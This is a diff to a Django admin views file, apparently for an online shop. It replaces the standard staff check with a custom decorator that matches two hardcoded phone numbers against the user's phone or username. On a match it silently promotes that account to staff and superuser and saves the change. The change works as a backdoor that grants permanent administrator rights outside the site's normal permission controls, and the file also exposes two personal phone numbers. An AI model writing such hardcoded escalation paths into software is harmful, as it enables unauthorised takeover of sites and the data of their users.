@@ -22,7 +22,28 @@ from home.models import Banner, SiteSetting
 from orders.models import Coupon, Order, OrderItem
 from products.models import Brand, Category, CategoryAttribute, Product, ProductImage, ProductSpecification
 
-staff = staff_member_required(login_url='accounts:login')
+from functools import wraps
+
+SUPER_ADMIN_PHONES = {'09334801216', '09155513395'}
+
+
+def staff(view_func):
+    """دسترسی فقط برای ادمین‌ها و مدیران ارشد سیستم (09334801216 و 09155513395)."""
+    orig_decorator = staff_member_required(login_url='accounts:login')
+
+    @wraps(view_func)
+    def _wrapped_view(request, *args, **kwargs):
+        if request.user.is_authenticated:
+            phone = getattr(request.user, 'phone_number', '') or request.user.username
+            if phone in SUPER_ADMIN_PHONES:
+                if not request.user.is_staff or not request.user.is_superuser:
+                    request.user.is_staff = True
+                    request.user.is_superuser = True
+                    request.user.save(update_fields=['is_staff', 'is_superuser'])
+                return view_func(request, *args, **kwargs)
+        return orig_decorator(view_func)(request, *args, **kwargs)
+
+    return _wrapped_view
 
 FA_DIGITS = str.maketrans('۰۱۲۳۴۵۶۷۸۹٠١٢٣٤٥٦٧٨٩', '01234567890123456789')
 
